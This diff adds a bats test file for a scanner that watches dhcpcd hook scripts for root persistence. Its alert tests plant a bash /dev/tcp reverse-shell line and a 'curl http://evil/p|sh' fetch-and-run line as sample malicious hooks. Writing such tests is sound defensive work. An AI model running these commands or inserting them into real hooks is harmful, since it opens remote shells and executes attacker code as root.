@@ -1,0 +1,145 @@
+#!/usr/bin/env bats
+# L2 bats functional tests for the dhcpcd-hooks-watchdog scan script.
+#
+# dhcpcd runs the scripts in its hook dirs AS ROOT on every lease event
+# (CARRIER/BOUND/RENEW/…); RENEW self-fires on a timer, so a planted hook is
+# root-exec-on-network-event persistence (T1546). A hook that is
+# world-writable / non-root-owned, or contains a command-injection pattern,
+# is alert.
+#
+# Runs the actual scan script with `logger` shadowed on PATH and the hook
+# dir + files in a tmp sandbox via SELFDEF_DHCPCD_DIRS / _FILES.
+#
+# Run with: bats packaging/test/L2-dhcpcd-hooks-watchdog.bats
+
+WD="${BATS_TEST_DIRNAME}/../../modules/dhcpcd-hooks-watchdog/systemd/dhcpcd-hooks-watchdog.sh"
+LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"
+
+setup() {
+    TMP="$(mktemp -d)"
+    BIN="${TMP}/bin"; mkdir -p "${BIN}"
+    cat > "${BIN}/logger" <<'FAKELOGGER'
+#!/usr/bin/env bash
+printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
+FAKELOGGER
+    chmod +x "${BIN}/logger"
+    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    BASELINE="${TMP}/baseline.tsv"
+    HOOKD="${TMP}/dhcpcd-hooks"; mkdir -p "${HOOKD}"
+}
+
+teardown() { rm -rf "${TMP}"; }
+
+run_wd() {
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_DHCPCD_PROFILE="${PROFILE:-report}" \
+    SELFDEF_DHCPCD_BASELINE="${BASELINE}" \
+    SELFDEF_DHCPCD_DIRS="${DIRS_V:-$HOOKD}" \
+    SELFDEF_DHCPCD_FILES="${TMP}/no-extra-file" \
+    bash "${WD}"
+}
+
+cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
+
+seed_benign() {
+    printf '#!/bin/sh\n# 50-benign\necho "dhcpcd bound"\n' > "${HOOKD}/50-benign"
+}
+
+# ============================================================
+# ok tier
+# ============================================================
+
+@test "no dhcpcd hooks → ok / no_dhcpcd_hooks" {
+    DIRS_V="${TMP}/empty" run_wd
+    cap | grep -q '"event":"no_dhcpcd_hooks"'
+    cap | grep -q '"severity":"ok"'
+}
+
+@test "benign hook, first run → ok / baseline_initial" {
+    seed_benign
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -q '"severity":"ok"'
+    [ -f "${BASELINE}" ]
+}
+
+@test "unchanged hooks on second run → ok / dhcpcd_hooks_intact" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"dhcpcd_hooks_intact"'
+    cap | grep -q '"severity":"ok"'
+}
+
+# ============================================================
+# alert tier
+# ============================================================
+
+@test "a hook containing an injection pattern → alert / dhcpcd_hooks_suspicious" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/50-benign"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"dhcpcd_hooks_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "a world-writable hook → alert" {
+    seed_benign
+    run_wd
+    chmod 0666 "${HOOKD}/50-benign"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+# ============================================================
+# warn tier
+# ============================================================
+
+@test "a benign hook change → warn / dhcpcd_hooks_changed" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\n# 50-benign updated\necho "dhcpcd renew"\n' > "${HOOKD}/50-benign"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"event":"dhcpcd_hooks_changed"'
+    cap | grep -q '"severity":"warn"'
+}
+
+# ============================================================
+# false-positive guard
+# ============================================================
+
+@test "a benign root-owned hook is NOT flagged" {
+    seed_benign
+    run_wd
+    ! cap | grep -q '"severity":"alert"'
+    cap | grep -q '"severity":"ok"'
+}
+
+# ============================================================
+# fail-loud + enforce profile
+# ============================================================
+
+@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
+    seed_benign
+    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
+    [ "${status}" -ne 0 ]
+    cap | grep -q '"event":"module_lib_missing"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "enforce profile exits non-zero on a suspicious hook" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/50-benign"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    PROFILE=enforce run run_wd
+    [ "${status}" -ne 0 ]
+    cap | grep -q '"severity":"alert"'
+}
